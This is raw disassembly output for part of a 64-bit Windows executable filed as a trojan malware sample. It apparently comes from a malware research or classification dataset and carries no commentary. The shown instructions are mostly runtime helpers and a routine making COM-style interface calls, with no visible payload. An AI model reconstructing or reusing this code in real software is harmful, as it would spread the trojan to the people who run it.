
malware_samples/trojan/3c84e04d162a5220603d593ee9c84627fd9e25909e764d6ea1d4f9c91b9e73aa.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 0d 95 30 00 00 	lea    0x3095(%rip),%rcx        # 0x14000409c
   140001007:	e9 e0 22 00 00       	jmp    0x1400032ec
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	48 8d 05 61 77 00 00 	lea    0x7761(%rip),%rax        # 0x140008778
   140001017:	c3                   	ret
   140001018:	cc                   	int3
   140001019:	cc                   	int3
   14000101a:	cc                   	int3
   14000101b:	cc                   	int3
   14000101c:	cc                   	int3
   14000101d:	cc                   	int3
   14000101e:	cc                   	int3
   14000101f:	cc                   	int3
   140001020:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001025:	57                   	push   %rdi
   140001026:	48 83 ec 20          	sub    $0x20,%rsp
   14000102a:	48 8b d9             	mov    %rcx,%rbx
   14000102d:	ff 15 fd 40 00 00    	call   *0x40fd(%rip)        # 0x140005130
   140001033:	48 8b f8             	mov    %rax,%rdi
   140001036:	ff 15 04 41 00 00    	call   *0x4104(%rip)        # 0x140005140
   14000103c:	4c 8b c8             	mov    %rax,%r9
   14000103f:	48 81 ff 80 96 98 00 	cmp    $0x989680,%rdi
   140001046:	75 15                	jne    0x14000105d
   140001048:	49 6b c1 64          	imul   $0x64,%r9,%rax
   14000104c:	48 89 03             	mov    %rax,(%rbx)
   14000104f:	48 8b c3             	mov    %rbx,%rax
   140001052:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001057:	48 83 c4 20          	add    $0x20,%rsp
   14000105b:	5f                   	pop    %rdi
   14000105c:	c3                   	ret
   14000105d:	48 81 ff 00 36 6e 01 	cmp    $0x16e3600,%rdi
   140001064:	75 65                	jne    0x1400010cb
   140001066:	49 ba f3 8c 90 94 07 	movabs $0xb2f4fc0794908cf3,%r10
   14000106d:	fc f4 b2 
   140001070:	49 8b c2             	mov    %r10,%rax
   140001073:	49 f7 e9             	imul   %r9
   140001076:	49 8b c2             	mov    %r10,%rax
   140001079:	4d 8d 04 11          	lea    (%r9,%rdx,1),%r8
   14000107d:	49 c1 f8 18          	sar    $0x18,%r8
   140001081:	49 8b c8             	mov    %r8,%rcx
   140001084:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140001088:	4c 03 c1             	add    %rcx,%r8
   14000108b:	49 69 c8 00 36 6e 01 	imul   $0x16e3600,%r8,%rcx
   140001092:	4c 2b c9             	sub    %rcx,%r9
   140001095:	49 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%r9,%rcx
   14000109c:	48 f7 e9             	imul   %rcx
   14000109f:	48 03 d1             	add    %rcx,%rdx
   1400010a2:	48 c1 fa 18          	sar    $0x18,%rdx
   1400010a6:	48 8b c2             	mov    %rdx,%rax
   1400010a9:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400010ad:	48 03 d0             	add    %rax,%rdx
   1400010b0:	49 69 c0 00 ca 9a 3b 	imul   $0x3b9aca00,%r8,%rax
   1400010b7:	48 03 d0             	add    %rax,%rdx
   1400010ba:	48 8b c3             	mov    %rbx,%rax
   1400010bd:	48 89 13             	mov    %rdx,(%rbx)
   1400010c0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010c5:	48 83 c4 20          	add    $0x20,%rsp
   1400010c9:	5f                   	pop    %rdi
   1400010ca:	c3                   	ret
   1400010cb:	48 99                	cqto
   1400010cd:	48 f7 ff             	idiv   %rdi
   1400010d0:	48 8b c8             	mov    %rax,%rcx
   1400010d3:	48 69 c2 00 ca 9a 3b 	imul   $0x3b9aca00,%rdx,%rax
   1400010da:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   1400010e1:	48 99                	cqto
   1400010e3:	48 f7 ff             	idiv   %rdi
   1400010e6:	48 03 c1             	add    %rcx,%rax
   1400010e9:	48 89 03             	mov    %rax,(%rbx)
   1400010ec:	48 8b c3             	mov    %rbx,%rax
   1400010ef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010f4:	48 83 c4 20          	add    $0x20,%rsp
   1400010f8:	5f                   	pop    %rdi
   1400010f9:	c3                   	ret
   1400010fa:	cc                   	int3
   1400010fb:	cc                   	int3
   1400010fc:	cc                   	int3
   1400010fd:	cc                   	int3
   1400010fe:	cc                   	int3
   1400010ff:	cc                   	int3
   140001100:	40 53                	rex push %rbx
   140001102:	48 83 ec 20          	sub    $0x20,%rsp
   140001106:	48 8b d9             	mov    %rcx,%rbx
   140001109:	48 8b c2             	mov    %rdx,%rax
   14000110c:	48 8d 0d b5 43 00 00 	lea    0x43b5(%rip),%rcx        # 0x1400054c8
   140001113:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001116:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000111a:	48 89 0b             	mov    %rcx,(%rbx)
   14000111d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001121:	0f 11 02             	movups %xmm0,(%rdx)
   140001124:	ff 15 06 41 00 00    	call   *0x4106(%rip)        # 0x140005230
   14000112a:	48 8b c3             	mov    %rbx,%rax
   14000112d:	48 83 c4 20          	add    $0x20,%rsp
   140001131:	5b                   	pop    %rbx
   140001132:	c3                   	ret
   140001133:	cc                   	int3
   140001134:	cc                   	int3
   140001135:	cc                   	int3
   140001136:	cc                   	int3
   140001137:	cc                   	int3
   140001138:	cc                   	int3
   140001139:	cc                   	int3
   14000113a:	cc                   	int3
   14000113b:	cc                   	int3
   14000113c:	cc                   	int3
   14000113d:	cc                   	int3
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001144:	48 8d 05 cd 43 00 00 	lea    0x43cd(%rip),%rax        # 0x140005518
   14000114b:	48 85 d2             	test   %rdx,%rdx
   14000114e:	48 0f 45 c2          	cmovne %rdx,%rax
   140001152:	c3                   	ret
   140001153:	cc                   	int3
   140001154:	cc                   	int3
   140001155:	cc                   	int3
   140001156:	cc                   	int3
   140001157:	cc                   	int3
   140001158:	cc                   	int3
   140001159:	cc                   	int3
   14000115a:	cc                   	int3
   14000115b:	cc                   	int3
   14000115c:	cc                   	int3
   14000115d:	cc                   	int3
   14000115e:	cc                   	int3
   14000115f:	cc                   	int3
   140001160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001165:	57                   	push   %rdi
   140001166:	48 83 ec 20          	sub    $0x20,%rsp
   14000116a:	48 8d 05 57 43 00 00 	lea    0x4357(%rip),%rax        # 0x1400054c8
   140001171:	48 8b f9             	mov    %rcx,%rdi
   140001174:	48 89 01             	mov    %rax,(%rcx)
   140001177:	8b da                	mov    %edx,%ebx
   140001179:	48 83 c1 08          	add    $0x8,%rcx
   14000117d:	ff 15 b5 40 00 00    	call   *0x40b5(%rip)        # 0x140005238
   140001183:	f6 c3 01             	test   $0x1,%bl
   140001186:	74 0d                	je     0x140001195
   140001188:	ba 18 00 00 00       	mov    $0x18,%edx
   14000118d:	48 8b cf             	mov    %rdi,%rcx
   140001190:	e8 8b 1b 00 00       	call   0x140002d20
   140001195:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000119a:	48 8b c7             	mov    %rdi,%rax
   14000119d:	48 83 c4 20          	add    $0x20,%rsp
   1400011a1:	5f                   	pop    %rdi
   1400011a2:	c3                   	ret
   1400011a3:	cc                   	int3
   1400011a4:	cc                   	int3
   1400011a5:	cc                   	int3
   1400011a6:	cc                   	int3
   1400011a7:	cc                   	int3
   1400011a8:	cc                   	int3
   1400011a9:	cc                   	int3
   1400011aa:	cc                   	int3
   1400011ab:	cc                   	int3
   1400011ac:	cc                   	int3
   1400011ad:	cc                   	int3
   1400011ae:	cc                   	int3
   1400011af:	cc                   	int3
   1400011b0:	48 8d 05 11 43 00 00 	lea    0x4311(%rip),%rax        # 0x1400054c8
   1400011b7:	48 89 01             	mov    %rax,(%rcx)
   1400011ba:	48 83 c1 08          	add    $0x8,%rcx
   1400011be:	48 ff 25 73 40 00 00 	rex.W jmp *0x4073(%rip)        # 0x140005238
   1400011c5:	cc                   	int3
   1400011c6:	cc                   	int3
   1400011c7:	cc                   	int3
   1400011c8:	cc                   	int3
   1400011c9:	cc                   	int3
   1400011ca:	cc                   	int3
   1400011cb:	cc                   	int3
   1400011cc:	cc                   	int3
   1400011cd:	cc                   	int3
   1400011ce:	cc                   	int3
   1400011cf:	cc                   	int3
   1400011d0:	48 8d 05 59 43 00 00 	lea    0x4359(%rip),%rax        # 0x140005530
   1400011d7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400011de:	00 
   1400011df:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400011e3:	48 8d 05 1e 43 00 00 	lea    0x431e(%rip),%rax        # 0x140005508
   1400011ea:	48 89 01             	mov    %rax,(%rcx)
   1400011ed:	48 8b c1             	mov    %rcx,%rax
   1400011f0:	c3                   	ret
   1400011f1:	cc                   	int3
   1400011f2:	cc                   	int3
   1400011f3:	cc                   	int3
   1400011f4:	cc                   	int3
   1400011f5:	cc                   	int3
   1400011f6:	cc                   	int3
   1400011f7:	cc                   	int3
   1400011f8:	cc                   	int3
   1400011f9:	cc                   	int3
   1400011fa:	cc                   	int3
   1400011fb:	cc                   	int3
   1400011fc:	cc                   	int3
   1400011fd:	cc                   	int3
   1400011fe:	cc                   	int3
   1400011ff:	cc                   	int3
   140001200:	48 83 ec 48          	sub    $0x48,%rsp
   140001204:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001209:	e8 c2 ff ff ff       	call   0x1400011d0
   14000120e:	48 8d 15 1b 55 00 00 	lea    0x551b(%rip),%rdx        # 0x140006730
   140001215:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000121a:	e8 3d 2a 00 00       	call   0x140003c5c
   14000121f:	cc                   	int3
   140001220:	40 53                	rex push %rbx
   140001222:	48 83 ec 20          	sub    $0x20,%rsp
   140001226:	48 8b d9             	mov    %rcx,%rbx
   140001229:	48 8b c2             	mov    %rdx,%rax
   14000122c:	48 8d 0d 95 42 00 00 	lea    0x4295(%rip),%rcx        # 0x1400054c8
   140001233:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001236:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000123a:	48 89 0b             	mov    %rcx,(%rbx)
   14000123d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001241:	0f 11 02             	movups %xmm0,(%rdx)
   140001244:	ff 15 e6 3f 00 00    	call   *0x3fe6(%rip)        # 0x140005230
   14000124a:	48 8d 05 b7 42 00 00 	lea    0x42b7(%rip),%rax        # 0x140005508
   140001251:	48 89 03             	mov    %rax,(%rbx)
   140001254:	48 8b c3             	mov    %rbx,%rax
   140001257:	48 83 c4 20          	add    $0x20,%rsp
   14000125b:	5b                   	pop    %rbx
   14000125c:	c3                   	ret
   14000125d:	cc                   	int3
   14000125e:	cc                   	int3
   14000125f:	cc                   	int3
   140001260:	40 53                	rex push %rbx
   140001262:	48 83 ec 20          	sub    $0x20,%rsp
   140001266:	48 8b d9             	mov    %rcx,%rbx
   140001269:	48 8b c2             	mov    %rdx,%rax
   14000126c:	48 8d 0d 55 42 00 00 	lea    0x4255(%rip),%rcx        # 0x1400054c8
   140001273:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001276:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000127a:	48 89 0b             	mov    %rcx,(%rbx)
   14000127d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001281:	0f 11 02             	movups %xmm0,(%rdx)
   140001284:	ff 15 a6 3f 00 00    	call   *0x3fa6(%rip)        # 0x140005230
   14000128a:	48 8d 05 4f 42 00 00 	lea    0x424f(%rip),%rax        # 0x1400054e0
   140001291:	48 89 03             	mov    %rax,(%rbx)
   140001294:	48 8b c3             	mov    %rbx,%rax
   140001297:	48 83 c4 20          	add    $0x20,%rsp
   14000129b:	5b                   	pop    %rbx
   14000129c:	c3                   	ret
   14000129d:	cc                   	int3
   14000129e:	cc                   	int3
   14000129f:	cc                   	int3
   1400012a0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400012a5:	57                   	push   %rdi
   1400012a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400012aa:	48 8b 19             	mov    (%rcx),%rbx
   1400012ad:	48 8b f9             	mov    %rcx,%rdi
   1400012b0:	48 85 db             	test   %rbx,%rbx
   1400012b3:	74 4e                	je     0x140001303
   1400012b5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400012ba:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   1400012bf:	83 f8 01             	cmp    $0x1,%eax
   1400012c2:	75 38                	jne    0x1400012fc
   1400012c4:	48 8b 0b             	mov    (%rbx),%rcx
   1400012c7:	48 85 c9             	test   %rcx,%rcx
   1400012ca:	74 0d                	je     0x1400012d9
   1400012cc:	ff 15 96 3e 00 00    	call   *0x3e96(%rip)        # 0x140005168
   1400012d2:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   1400012d9:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400012dd:	48 85 c9             	test   %rcx,%rcx
   1400012e0:	74 0d                	je     0x1400012ef
   1400012e2:	e8 39 1a 00 00       	call   0x140002d20
   1400012e7:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   1400012ee:	00 
   1400012ef:	ba 18 00 00 00       	mov    $0x18,%edx
   1400012f4:	48 8b cb             	mov    %rbx,%rcx
   1400012f7:	e8 24 1a 00 00       	call   0x140002d20
   1400012fc:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   140001303:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001308:	48 83 c4 20          	add    $0x20,%rsp
   14000130c:	5f                   	pop    %rdi
   14000130d:	c3                   	ret
   14000130e:	cc                   	int3
   14000130f:	cc                   	int3
   140001310:	48 ff 25 39 3e 00 00 	rex.W jmp *0x3e39(%rip)        # 0x140005150
   140001317:	cc                   	int3
   140001318:	cc                   	int3
   140001319:	cc                   	int3
   14000131a:	cc                   	int3
   14000131b:	cc                   	int3
   14000131c:	cc                   	int3
   14000131d:	cc                   	int3
   14000131e:	cc                   	int3
   14000131f:	cc                   	int3
   140001320:	48 83 ec 28          	sub    $0x28,%rsp
   140001324:	48 8d 0d 1d 42 00 00 	lea    0x421d(%rip),%rcx        # 0x140005548
   14000132b:	ff 15 07 3e 00 00    	call   *0x3e07(%rip)        # 0x140005138
   140001331:	cc                   	int3
   140001332:	cc                   	int3
   140001333:	cc                   	int3
   140001334:	cc                   	int3
   140001335:	cc                   	int3
   140001336:	cc                   	int3
   140001337:	cc                   	int3
   140001338:	cc                   	int3
   140001339:	cc                   	int3
   14000133a:	cc                   	int3
   14000133b:	cc                   	int3
   14000133c:	cc                   	int3
   14000133d:	cc                   	int3
   14000133e:	cc                   	int3
   14000133f:	cc                   	int3
   140001340:	48 83 ec 28          	sub    $0x28,%rsp
   140001344:	81 fa 12 03 00 00    	cmp    $0x312,%edx
   14000134a:	75 1c                	jne    0x140001368
   14000134c:	49 83 f8 01          	cmp    $0x1,%r8
   140001350:	75 16                	jne    0x140001368
   140001352:	33 c9                	xor    %ecx,%ecx
   140001354:	c6 05 59 6d 00 00 00 	movb   $0x0,0x6d59(%rip)        # 0x1400080b4
   14000135b:	ff 15 7f 3e 00 00    	call   *0x3e7f(%rip)        # 0x1400051e0
   140001361:	33 c0                	xor    %eax,%eax
   140001363:	48 83 c4 28          	add    $0x28,%rsp
   140001367:	c3                   	ret
   140001368:	48 83 c4 28          	add    $0x28,%rsp
   14000136c:	48 ff 25 3d 3e 00 00 	rex.W jmp *0x3e3d(%rip)        # 0x1400051b0
   140001373:	cc                   	int3
   140001374:	cc                   	int3
   140001375:	cc                   	int3
   140001376:	cc                   	int3
   140001377:	cc                   	int3
   140001378:	cc                   	int3
   140001379:	cc                   	int3
   14000137a:	cc                   	int3
   14000137b:	cc                   	int3
   14000137c:	cc                   	int3
   14000137d:	cc                   	int3
   14000137e:	cc                   	int3
   14000137f:	cc                   	int3
   140001380:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001385:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000138a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000138f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001394:	55                   	push   %rbp
   140001395:	48 8d ac 24 30 ff ff 	lea    -0xd0(%rsp),%rbp
   14000139c:	ff 
   14000139d:	48 81 ec d0 01 00 00 	sub    $0x1d0,%rsp
   1400013a4:	48 8b 05 95 6c 00 00 	mov    0x6c95(%rip),%rax        # 0x140008040
   1400013ab:	48 33 c4             	xor    %rsp,%rax
   1400013ae:	48 89 85 c0 00 00 00 	mov    %rax,0xc0(%rbp)
   1400013b5:	33 d2                	xor    %edx,%edx
   1400013b7:	33 c9                	xor    %ecx,%ecx
   1400013b9:	ff 15 e1 3f 00 00    	call   *0x3fe1(%rip)        # 0x1400053a0
   1400013bf:	85 c0                	test   %eax,%eax
   1400013c1:	0f 88 0e 03 00 00    	js     0x1400016d5
   1400013c7:	45 33 f6             	xor    %r14d,%r14d
   1400013ca:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   1400013cf:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   1400013d4:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400013d9:	c7 44 24 28 03 00 00 	movl   $0x3,0x28(%rsp)
   1400013e0:	00 
   1400013e1:	c7 44 24 20 06 00 00 	movl   $0x6,0x20(%rsp)
   1400013e8:	00 
   1400013e9:	45 33 c9             	xor    %r9d,%r9d
   1400013ec:	45 33 c0             	xor    %r8d,%r8d
   1400013ef:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   1400013f4:	8b d7                	mov    %edi,%edx
   1400013f6:	33 c9                	xor    %ecx,%ecx
   1400013f8:	ff 15 9a 3f 00 00    	call   *0x3f9a(%rip)        # 0x140005398
   1400013fe:	8b d8                	mov    %eax,%ebx
   140001400:	85 c0                	test   %eax,%eax
   140001402:	0f 88 c5 02 00 00    	js     0x1400016cd
   140001408:	4c 89 75 68          	mov    %r14,0x68(%rbp)
   14000140c:	48 8d 45 68          	lea    0x68(%rbp),%rax
   140001410:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001415:	4c 8d 0d 3c 40 00 00 	lea    0x403c(%rip),%r9        # 0x140005458
   14000141c:	33 d2                	xor    %edx,%edx
   14000141e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001424:	48 8d 0d 3d 40 00 00 	lea    0x403d(%rip),%rcx        # 0x140005468
   14000142b:	ff 15 5f 3f 00 00    	call   *0x3f5f(%rip)        # 0x140005390
   140001431:	8b d8                	mov    %eax,%ebx
   140001433:	85 c0                	test   %eax,%eax
   140001435:	0f 88 92 02 00 00    	js     0x1400016cd
   14000143b:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   14000143f:	ff 15 1b 3d 00 00    	call   *0x3d1b(%rip)        # 0x140005160
   140001445:	90                   	nop
   140001446:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   14000144a:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   14000144f:	f2 0f 10 45 b8       	movsd  -0x48(%rbp),%xmm0
   140001454:	f2 0f 11 44 24 58    	movsd  %xmm0,0x58(%rsp)
   14000145a:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   14000145e:	ff 15 fc 3c 00 00    	call   *0x3cfc(%rip)        # 0x140005160
   140001464:	90                   	nop
   140001465:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   140001469:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   14000146d:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   140001472:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   140001478:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   14000147c:	ff 15 de 3c 00 00    	call   *0x3cde(%rip)        # 0x140005160
   140001482:	90                   	nop
   140001483:	0f 10 45 20          	movups 0x20(%rbp),%xmm0
   140001487:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   14000148b:	f2 0f 10 45 30       	movsd  0x30(%rbp),%xmm0
   140001490:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   140001496:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   14000149a:	ff 15 c0 3c 00 00    	call   *0x3cc0(%rip)        # 0x140005160
   1400014a0:	90                   	nop
   1400014a1:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   1400014a6:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   1400014ab:	f2 0f 10 44 24 58    	movsd  0x58(%rsp),%xmm0
   1400014b1:	f2 0f 11 45 80       	movsd  %xmm0,-0x80(%rbp)
   1400014b6:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   1400014ba:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400014be:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   1400014c4:	f2 0f 11 45 d0       	movsd  %xmm0,-0x30(%rbp)
   1400014c9:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   1400014cd:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   1400014d1:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   1400014d7:	f2 0f 11 45 f0       	movsd  %xmm0,-0x10(%rbp)
   1400014dc:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   1400014e0:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   1400014e4:	f2 0f 10 4d 10       	movsd  0x10(%rbp),%xmm1
   1400014e9:	f2 0f 11 4d 50       	movsd  %xmm1,0x50(%rbp)
   1400014ee:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400014f2:	48 8b 01             	mov    (%rcx),%rax
   1400014f5:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400014fa:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400014ff:	4c 8d 4d c0          	lea    -0x40(%rbp),%r9
   140001503:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140001507:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   14000150b:	ff 50 50             	call   *0x50(%rax)
   14000150e:	8b d8                	mov    %eax,%ebx
   140001510:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140001514:	ff 15 36 3c 00 00    	call   *0x3c36(%rip)        # 0x140005150
   14000151a:	90                   	nop
   14000151b:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   14000151f:	ff 15 2b 3c 00 00    	call   *0x3c2b(%rip)        # 0x140005150
   140001525:	90                   	nop
   140001526:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   14000152a:	ff 15 20 3c 00 00    	call   *0x3c20(%rip)        # 0x140005150
   140001530:	90                   	nop
   140001531:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140001535:	ff 15 15 3c 00 00    	call   *0x3c15(%rip)        # 0x140005150
   14000153b:	85 db                	test   %ebx,%ebx
   14000153d:	0f 88 6b 03 00 00    	js     0x1400018ae
   140001543:	4c 89 75 70          	mov    %r14,0x70(%rbp)
   140001547:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000154c:	e8 d7 17 00 00       	call   0x140002d28
   140001551:	48 8b d8             	mov    %rax,%rbx
   140001554:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001559:	48 85 c0             	test   %rax,%rax
   14000155c:	74 32                	je     0x140001590
   14000155e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001561:	33 c0                	xor    %eax,%eax
   140001563:	0f 11 03             	movups %xmm0,(%rbx)
   140001566:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000156a:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000156e:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140001575:	48 8d 0d e8 3f 00 00 	lea    0x3fe8(%rip),%rcx        # 0x140005564
   14000157c:	ff 15 d6 3b 00 00    	call   *0x3bd6(%rip)        # 0x140005158
   140001582:	48 89 03             	mov    %rax,(%rbx)
   140001585:	48 85 c0             	test   %rax,%rax
   140001588:	0f 84 87 07 00 00    	je     0x140001d15
   14000158e:	eb 03                	jmp    0x140001593
   140001590:	49 8b de             	mov    %r14,%rbx
   140001593:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001598:	48 85 db             	test   %rbx,%rbx
   14000159b:	0f 84 b6 07 00 00    	je     0x140001d57
   1400015a1:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400015a5:	48 8b 01             	mov    (%rcx),%rax
   1400015a8:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   1400015ac:	48 8b 13             	mov    (%rbx),%rdx
   1400015af:	ff 50 38             	call   *0x38(%rax)
   1400015b2:	8b f0                	mov    %eax,%esi
   1400015b4:	8b cf                	mov    %edi,%ecx
   1400015b6:	f0 0f c1 4b 10       	lock xadd %ecx,0x10(%rbx)
   1400015bb:	83 f9 01             	cmp    $0x1,%ecx
   1400015be:	75 30                	jne    0x1400015f0
   1400015c0:	48 8b 0b             	mov    (%rbx),%rcx
   1400015c3:	48 85 c9             	test   %rcx,%rcx
   1400015c6:	74 09                	je     0x1400015d1
   1400015c8:	ff 15 9a 3b 00 00    	call   *0x3b9a(%rip)        # 0x140005168
   1400015ce:	4c 89 33             	mov    %r14,(%rbx)
   1400015d1:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400015d5:	48 85 c9             	test   %rcx,%rcx
   1400015d8:	74 09                	je     0x1400015e3
   1400015da:	e8 41 17 00 00       	call   0x140002d20
   1400015df:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   1400015e3:	ba 18 00 00 00       	mov    $0x18,%edx
   1400015e8:	48 8b cb             	mov    %rbx,%rcx
   1400015eb:	e8 30 17 00 00       	call   0x140002d20
   1400015f0:	85 f6                	test   %esi,%esi
   1400015f2:	0f 88 fb 06 00 00    	js     0x140001cf3
   1400015f8:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400015fd:	e8 26 17 00 00       	call   0x140002d28
   140001602:	48 8b d8             	mov    %rax,%rbx
   140001605:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000160a:	48 85 c0             	test   %rax,%rax
   14000160d:	74 32                	je     0x140001641
   14000160f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001612:	33 c0                	xor    %eax,%eax
   140001614:	0f 11 03             	movups %xmm0,(%rbx)
   140001617:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000161b:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   14000161f:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%rbx)
   140001626:	48 8d 0d 3b 3f 00 00 	lea    0x3f3b(%rip),%rcx        # 0x140005568
   14000162d:	ff 15 25 3b 00 00    	call   *0x3b25(%rip)        # 0x140005158
   140001633:	48 89 03             	mov    %rax,(%rbx)
   140001636:	48 85 c0             	test   %rax,%rax
   140001639:	0f 84 e1 06 00 00    	je     0x140001d20
   14000163f:	eb 03                	jmp    0x140001644
   140001641:	49 8b de             	mov    %r14,%rbx
   140001644:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001649:	48 85 db             	test   %rbx,%rbx
   14000164c:	0f 84 05 07 00 00    	je     0x140001d57
   140001652:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140001656:	48 8b 01             	mov    (%rcx),%rax
   140001659:	45 33 c0             	xor    %r8d,%r8d
   14000165c:	48 8b 13             	mov    (%rbx),%rdx
   14000165f:	ff 50 78             	call   *0x78(%rax)
   140001662:	90                   	nop
   140001663:	8b c7                	mov    %edi,%eax
   140001665:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000166a:	83 f8 01             	cmp    $0x1,%eax
   14000166d:	75 30                	jne    0x14000169f
   14000166f:	48 8b 0b             	mov    (%rbx),%rcx
   140001672:	48 85 c9             	test   %rcx,%rcx
   140001675:	74 09                	je     0x140001680
   140001677:	ff 15 eb 3a 00 00    	call   *0x3aeb(%rip)        # 0x140005168
   14000167d:	4c 89 33             	mov    %r14,(%rbx)
   140001680:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001684:	48 85 c9             	test   %rcx,%rcx
   140001687:	74 09                	je     0x140001692
   140001689:	e8 92 16 00 00       	call   0x140002d20
   14000168e:	4c 89 73 08          	mov    %r14,0x8(%rbx)
   140001692:	ba 18 00 00 00       	mov    $0x18,%edx
   140001697:	48 8b cb             	mov    %rbx,%rcx
   14000169a:	e8 81 16 00 00       	call   0x140002d20
   14000169f:	4c 89 75 60          	mov    %r14,0x60(%rbp)
   1400016a3:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   1400016a7:	48 8b 01             	mov    (%rcx),%rax
   1400016aa:	4c 8d 45 60          	lea    0x60(%rbp),%r8
   1400016ae:	33 d2                	xor    %edx,%edx
   1400016b0:	ff 50 48             	call   *0x48(%rax)
   1400016b3:	8b d8                	mov    %eax,%ebx
   1400016b5:	85 c0                	test   %eax,%eax
   1400016b7:	79 48                	jns    0x140001701
   1400016b9:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   1400016bd:	48 8b 11             	mov    (%rcx),%rdx
   1400016c0:	ff 52 10             	call   *0x10(%rdx)
   1400016c3:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
